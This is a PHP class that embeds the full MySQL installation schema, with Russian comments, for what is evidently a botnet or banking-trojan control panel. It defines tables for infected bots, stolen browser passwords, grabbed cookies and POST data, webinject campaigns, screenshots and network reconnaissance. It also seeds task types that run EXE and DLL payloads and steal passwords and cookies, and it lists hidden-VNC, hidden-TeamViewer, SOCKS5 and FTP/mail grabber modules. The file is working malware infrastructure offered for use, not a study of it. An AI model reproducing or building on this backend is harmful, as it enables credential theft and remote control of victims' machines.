<?php



class DBConfig
{
    private $sql = '
        SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
        SET AUTOCOMMIT = 0;
        START TRANSACTION;
        SET time_zone = "+00:00";
        
        
        /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
        /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
        /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
        /*!40101 SET NAMES utf8mb4 */;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `bots`
        --
        
        CREATE TABLE `bots` (
          `id` int(11) NOT NULL,
          `botid` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `hwid` text COLLATE utf8mb4_unicode_520_ci,
          `os` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
          `cpu` int(3) NOT NULL,
          `ip` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
          `last_ip` text COLLATE utf8mb4_unicode_520_ci,
          `layer_ip` text COLLATE utf8mb4_unicode_520_ci,
          `default_browser` text COLLATE utf8mb4_unicode_520_ci,
          `build_version` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
          `country` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
          `first_login` int(11) UNSIGNED DEFAULT NULL,
          `last_login` int(11) DEFAULT NULL,
          `display_width` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
          `architecture` tinyint(4) NOT NULL,
          `computer_name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `active_modules` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `comment` text COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `general_settings`
        --
        
        CREATE TABLE `general_settings` (
          `id` int(11) NOT NULL,
          `name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `setting_name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `setting_value` text COLLATE utf8mb4_unicode_520_ci NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Дамп данных таблицы `general_settings`
        --
        
        INSERT INTO `general_settings` (`id`, `name`, `setting_name`, `setting_value`) VALUES
        (1, \'Report Status\', \'report_status\', \'0\'),
        (2, \'Report Level\', \'report_level\', \'1\'),
        (3, \'Knock Timeout\', \'knock_timeout\', \'5\'),
        (4, \'Gate Status\', \'gate_status\', \'1\'),
        (5, \'Enter Page\', \'enter_page\', \'XkTdW1e9GA\'),
        (6, \'Lifetime\', \'lifetime\', \'7\');
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `http_grabber_settings`
        --
        
        CREATE TABLE `http_grabber_settings` (
          `id` int(11) NOT NULL,
          `config` mediumtext COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Дамп данных таблицы `http_grabber_settings`
        --
        
        INSERT INTO `http_grabber_settings` (`id`, `config`) VALUES
        (1, \'\');
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `logs`
        --
        
        CREATE TABLE `logs` (
          `id` int(11) NOT NULL,
          `level` tinyint(4) NOT NULL DEFAULT \'0\',
          `request_id` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `controller` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `function` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `log` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `error_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `main_tasks` (taskslog)
        --
        
        CREATE TABLE `main_tasks` (
          `id` int(11) NOT NULL,
          `time` int(11) NOT NULL,
          `os` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `country` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `bot_ids` text COLLATE utf8mb4_unicode_520_ci,
          `flows` text COLLATE utf8mb4_unicode_520_ci,
          `domain_names` text COLLATE utf8mb4_unicode_520_ci,
          `bots` int(11) NOT NULL,
          `bots_with_task` int(11) NOT NULL DEFAULT \'0\',
          `cpu` varchar(191) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `sid` int(11) NOT NULL DEFAULT \'0\',
          `method_type` smallint(3) NOT NULL,
          `context` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `flags` int(11) NOT NULL DEFAULT \'0\',
          `status` smallint(1) NOT NULL DEFAULT \'0\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `modules`
        --
        
        CREATE TABLE `modules` (
          `id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `hash_x32` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `hash_x64` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `url_x32` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `url_x64` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `path_x32` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `path_x64` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `context` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `status` smallint(1) NOT NULL DEFAULT \'0\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Дамп данных таблицы `modules`
        --
        
        INSERT INTO `modules` (`id`, `name`, `hash_x32`, `hash_x64`, `url_x32`, `url_x64`, `path_x32`, `path_x64`, `context`, `status`) VALUES
        (1, \'Hide VNC\', \'b80e8c6c63a953fc1258d28996b0ca8f\', \'b80e8c6c63a953fc1258d28996b0ca8f\', \'http://example.com/hvnc_module_x32.dll\', \'http://example.com/hvnc_module_x64.dll\', \'hvnc_x32.dll\', \'hvnc_x64.dll\', NULL, 1),
        (2, \'Hide TeamViewer\', \'37ce61ce49ccb77d852950b7589f56a3\', \'37ce61ce49ccb77d852950b7589f56a3\', \'http://example.com/htv_module_x32.dll\', \'http://example.com/htv_module_x64.dll\', \'htv_x32.dll\', \'htv_x32.dll\', NULL, 1),
        (3, \'Socks5\', \'socks_hash_x32\', \'socks_hash_x64\', \'http://example.com/socks_module_x32.dll\', \'http://example.com/socks_module_x64.dll\', \'\', \'\', NULL, 0),
        (4, \'FTP Grabber\', \'ftp_hash_x32\', \'ftp_hash_x64\', \'http://example.com/ftp_module_x32.dll\', \'http://example.com/ftp_module_x64.dll\', \'\', \'\', NULL, 0),
        (5, \'Mailers Grabber\', \'mailer_hash_x32\', \'mailer_hash_x64\', \'http://example.com/mailer_module_x32.dll\', \'http://example.com/mailer_module_x64.dll\', \'\', \'\', NULL, 0);
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `plogs`
        --
        
        CREATE TABLE `plogs` (
          `id` int(255) NOT NULL,
          `username` varchar(50) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `ipaddress` varchar(75) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `action` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `date` int(50) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Структура таблицы `reports_antivirus`
        --
        
        CREATE TABLE `reports_antivirus` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `reports_firewall`
        --
        
        CREATE TABLE `reports_firewall` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `reports_http_grabber`
        --
        
        CREATE TABLE `reports_http_grabber` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `url` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `useragent` text COLLATE utf8mb4_unicode_520_ci,
          `content_type` text COLLATE utf8mb4_unicode_520_ci,
          `accept_encoding` text COLLATE utf8mb4_unicode_520_ci,
          `accept_language` text COLLATE utf8mb4_unicode_520_ci,
          `referer` text COLLATE utf8mb4_unicode_520_ci,
          `cookie` text COLLATE utf8mb4_unicode_520_ci,
          `post_data` text COLLATE utf8mb4_unicode_520_ci,
          `flags` int(11) DEFAULT NULL,
          `insert_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `reports_netview_info`
        --
        
        CREATE TABLE `reports_netview_info` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `domain_name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `domain_role` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `extended_name` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `network_shares` mediumtext COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `reports_netview_info_clients`
        --
        
        CREATE TABLE `reports_netview_info_clients` (
          `id` int(11) NOT NULL,
          `reports_netview_info_id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `type` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `platform` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `comment` mediumtext COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `reports_screenshots`
        --
        
        CREATE TABLE `reports_screenshots` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `path` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `path_thumbnail` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `description` mediumtext COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `reports_software`
        --
        
        CREATE TABLE `reports_software` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `vendor` mediumtext COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `settings`
        --
        
        CREATE TABLE `settings` (
          `id` int(255) NOT NULL,
          `knock` int(10) NOT NULL,
          `dead` int(10) NOT NULL,
          `gate_status` int(1) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Дамп данных таблицы `settings`
        --
        
        INSERT INTO `settings` (`id`, `knock`, `dead`, `gate_status`) VALUES
        (1, 5, 7, 1);
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `stealer_passwords`
        --
        
        CREATE TABLE `stealer_passwords` (
          `id` int(11) NOT NULL,
          `bot_id` int(11) NOT NULL,
          `service` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `login` varchar(100) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `password` varchar(100) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `browser` text COLLATE utf8mb4_unicode_520_ci NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `taskslog`
        --
        
        CREATE TABLE `taskslog` (
          `id` int(11) NOT NULL,
          `task_id` int(11) DEFAULT NULL,
          `bot_id` int(11) NOT NULL,
          `status` int(11) UNSIGNED DEFAULT NULL,
          `is_completed` int(2) NOT NULL DEFAULT \'0\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `tasks_types`
        --
        
        CREATE TABLE `tasks_types` (
          `id` int(11) NOT NULL,
          `type_name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `type_identify` int(5) NOT NULL,
          `context_pattern` text COLLATE utf8mb4_unicode_520_ci,
          `module_id` int(11) NOT NULL DEFAULT \'0\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Дамп данных таблицы `tasks_types`
        --
        
        INSERT INTO `tasks_types` (`id`, `type_name`, `type_identify`, `context_pattern`, `module_id`) VALUES
        (1, \'CORE_EXECUTE_EXE\', 1, NULL, 0),
        (2, \'CORE_EXECUTE_DLL\', 2, NULL, 0),
        (3, \'CORE_UPDATE\', 3, NULL, 0),
        (4, \'CORE_UNINSTALL\', 4, NULL, 0),
        (5, \'CORE_RUNDLL\', 5, NULL, 0),
        (6, \'CORE_GET_SOFTWARE\', 6, NULL, 0),
        (7, \'CORE_GET_ANTIVIRUS\', 7, NULL, 0),
        (8, \'CORE_GET_FIREWALL\', 8, NULL, 0),
        (9, \'CORE_SCREENSHOT\', 9, NULL, 0),
        (10, \'CORE_GET_SYSTEM_INFO\', 10, NULL, 0),
        (11, \'NETVIEW_GET_INFO\', 11, NULL, 0),
        (12, \'SOFTWAREGRABBER_GET_PASSWORDS\', 12, NULL, 0),
        (13, \'SOFTWAREGRABBER_GET_COOKIES\', 13, NULL, 0),
        (14, \'SOFTWAREGRABBER_DELETE_COOKIES\', 14, NULL, 0);
        
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `users`
        --
        
        CREATE TABLE `users` (
          `id` int(255) NOT NULL,
          `username` varchar(50) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `password` varchar(300) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `last_online` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
          `privileges` varchar(300) COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `status` int(1) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        --
        -- Дамп данных таблицы `users`
        --
        
        INSERT INTO `users` (`id`, `username`, `password`, `privileges`, `status`) VALUES
        (1, \'admin\', \'3bff87dce154c1766c346b463affd41e2216ccad87957123de589967b9d2c5a8\', \'admin\', 1);
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `webinjects_campaigns`
        --
        
        CREATE TABLE `webinjects_campaigns` (
          `id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `description` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `botids` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `countries` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `group_id` int(11),
          `status` tinyint(4) NOT NULL DEFAULT \'1\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `webinjects_campaigns_injects`
        --
        
        CREATE TABLE `webinjects_campaigns_injects` (
          `id` int(11) NOT NULL,
          `campaign_id` int(11) NOT NULL,
          `inject_id` int(11) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `webinjects_campaigns_logs`
        --
        
        CREATE TABLE `webinjects_campaigns_logs` (
          `id` int(11) NOT NULL,
          `campaign_id` int(11) NOT NULL,
          `hwid` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `webinjects_groups`
        --
        
        CREATE TABLE `webinjects_groups` (
          `id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `description` mediumtext COLLATE utf8mb4_unicode_520_ci
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `webinjects_groups_injects`
        --
        
        CREATE TABLE `webinjects_groups_injects` (
          `id` int(11) NOT NULL,
          `group_id` int(11) NOT NULL,
          `inject_id` int(11) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------
        
        --
        -- Структура таблицы `webinjects_injects`
        --
        
        CREATE TABLE `webinjects_injects` (
          `id` int(11) NOT NULL,
          `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `description` mediumtext COLLATE utf8mb4_unicode_520_ci,
          `source` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
          `status` tinyint(4) DEFAULT \'1\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;
        
        -- --------------------------------------------------------

        --
        -- Структура таблицы `layers`
        --
        
        CREATE TABLE `layers` (
          `id` int(11) NOT NULL,
          `ip` text COLLATE utf8_unicode_520_ci NOT NULL,
          `active` tinyint(1) NOT NULL DEFAULT \'1\'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_520_ci;
        
        --
        -- Индексы сохранённых таблиц
        --
        
        --
        -- Индексы таблицы `bots`
        --
        ALTER TABLE `bots`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `general_settings`
        --
        ALTER TABLE `general_settings`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `http_grabber_settings`
        --
        ALTER TABLE `http_grabber_settings`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `logs`
        --
        ALTER TABLE `logs`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `main_tasks`
        --
        ALTER TABLE `main_tasks`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `modules`
        --
        ALTER TABLE `modules`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `plogs`
        --
        ALTER TABLE `plogs`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_antivirus`
        --
        ALTER TABLE `reports_antivirus`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_firewall`
        --
        ALTER TABLE `reports_firewall`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_http_grabber`
        --
        ALTER TABLE `reports_http_grabber`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_netview_info`
        --
        ALTER TABLE `reports_netview_info`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_netview_info_clients`
        --
        ALTER TABLE `reports_netview_info_clients`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_screenshots`
        --
        ALTER TABLE `reports_screenshots`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `reports_software`
        --
        ALTER TABLE `reports_software`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `settings`
        --
        ALTER TABLE `settings`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `stealer_passwords`
        --
        ALTER TABLE `stealer_passwords`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `taskslog`
        --
        ALTER TABLE `taskslog`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `tasks_types`
        --
        ALTER TABLE `tasks_types`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `users`
        --
        ALTER TABLE `users`
          ADD PRIMARY KEY (`id`);
          
        --
        -- Индексы таблицы `webinjects_injects`
        --
        ALTER TABLE `webinjects_injects`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `webinjects_campaigns`
        --
        ALTER TABLE `webinjects_campaigns`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `webinjects_campaigns_injects`
        --
        ALTER TABLE `webinjects_campaigns_injects`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `webinjects_campaigns_logs`
        --
        ALTER TABLE `webinjects_campaigns_logs`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `webinjects_groups`
        --
        ALTER TABLE `webinjects_groups`
          ADD PRIMARY KEY (`id`);
        
        --
        -- Индексы таблицы `webinjects_groups_injects`
        --
        ALTER TABLE `webinjects_groups_injects`
          ADD PRIMARY KEY (`id`);
          
        --
        -- Индексы таблицы `layers`
        --
        ALTER TABLE `layers`
          ADD PRIMARY KEY (`id`);
        
        
        -- ------------------------------------ [ /AUTO_INCREMENTS/ ] --------------------------------------
        
        
        --
        -- AUTO_INCREMENT для сохранённых таблиц
        --
        
        --
        -- AUTO_INCREMENT для таблицы `bots`
        --
        ALTER TABLE `bots`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `general_settings`
        --
        ALTER TABLE `general_settings`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
        
        --
        -- AUTO_INCREMENT для таблицы `http_grabber_settings`
        --
        ALTER TABLE `http_grabber_settings`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
        
        --
        -- AUTO_INCREMENT для таблицы `logs`
        --
        ALTER TABLE `logs`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `main_tasks`
        --
        ALTER TABLE `main_tasks`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `modules`
        --
        ALTER TABLE `modules`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
        
        --
        -- AUTO_INCREMENT для таблицы `plogs`
        --
        ALTER TABLE `plogs`
          MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_antivirus`
        --
        ALTER TABLE `reports_antivirus`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_firewall`
        --
        ALTER TABLE `reports_firewall`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_http_grabber`
        --
        ALTER TABLE `reports_http_grabber`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_netview_info`
        --
        ALTER TABLE `reports_netview_info`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_netview_info_clients`
        --
        ALTER TABLE `reports_netview_info_clients`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_screenshots`
        --
        ALTER TABLE `reports_screenshots`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `reports_software`
        --
        ALTER TABLE `reports_software`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `settings`
        --
        ALTER TABLE `settings`
          MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
        
        --
        -- AUTO_INCREMENT для таблицы `stealer_passwords`
        --
        ALTER TABLE `stealer_passwords`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `taskslog`
        --
        ALTER TABLE `taskslog`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `tasks_types`
        --
        ALTER TABLE `tasks_types`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
        
        --
        -- AUTO_INCREMENT для таблицы `users`
        --
        ALTER TABLE `users`
          MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
        
        --
        -- AUTO_INCREMENT для таблицы `webinjects_campaigns`
        --
        ALTER TABLE `webinjects_campaigns`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `webinjects_campaigns_injects`
        --
        ALTER TABLE `webinjects_campaigns_injects`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `webinjects_campaigns_logs`
        --
        ALTER TABLE `webinjects_campaigns_logs`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `webinjects_groups`
        --
        ALTER TABLE `webinjects_groups`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `webinjects_groups_injects`
        --
        ALTER TABLE `webinjects_groups_injects`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `webinjects_injects`
        --
        ALTER TABLE `webinjects_injects`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        --
        -- AUTO_INCREMENT для таблицы `layers`
        --
        ALTER TABLE `layers`
          MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
        
        -- ----------------------------------- [ \AUTO_INCREMENTS\ ] --------------------------------------
        
        -- ----------------------------------- [ /ADDITIONAL INDEXES/ ] -----------------------------------
        
        --
        -- Индексы таблицы `reports_software`
        --
        ALTER TABLE `reports_software` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        CREATE INDEX botid_name_vendor ON reports_software(bot_id, name(70), vendor(70));
        
        --
        -- Индексы таблицы `reports_antivirus`
        --
        ALTER TABLE `reports_antivirus` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        CREATE INDEX botid_name ON reports_antivirus(bot_id, name(70));
        
        --
        -- Индексы таблицы `reports_firewall`
        --
        ALTER TABLE `reports_firewall` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        CREATE INDEX botid_name ON reports_firewall(bot_id, name(70));
        
        --
        -- Индексы таблицы `reports_screenshots`
        --
        ALTER TABLE `reports_screenshots` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        
        --
        -- Индексы таблицы `stealer_passwords`
        --
        ALTER TABLE `stealer_passwords` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        
        --
        -- Индексы таблицы `reports_http_grabber`
        --
        ALTER TABLE `reports_http_grabber` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        
        --
        -- Индексы таблицы `reports_netview_info`
        --
        ALTER TABLE `reports_netview_info` ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
            
        --
        -- Индексы таблицы `reports_netview_info_clients`
        --
        ALTER TABLE `reports_netview_info_clients` ADD FOREIGN KEY (`reports_netview_info_id`) REFERENCES `reports_netview_info` (`id`) ON DELETE CASCADE;
        
        --
        -- Индексы таблицы `taskslog`
        --
        ALTER TABLE `taskslog`
          ADD FOREIGN KEY (`task_id`) REFERENCES `main_tasks` (`id`) ON DELETE CASCADE,
          ADD FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;
        
        --
        -- Индексы таблицы `webinjects_campaigns_injects`
        --
        ALTER TABLE `webinjects_campaigns_injects`
          ADD FOREIGN KEY (`campaign_id`) REFERENCES `webinjects_campaigns` (`id`) ON DELETE CASCADE,
          ADD FOREIGN KEY (`inject_id`) REFERENCES `webinjects_injects` (`id`) ON DELETE CASCADE;
        
        --
        -- Индексы таблицы `webinjects_groups_injects`
        --
        ALTER TABLE `webinjects_groups_injects`
          ADD FOREIGN KEY (`inject_id`) REFERENCES `webinjects_injects` (`id`) ON DELETE CASCADE,
          ADD FOREIGN KEY (`group_id`) REFERENCES `webinjects_groups` (`id`) ON DELETE CASCADE;
          
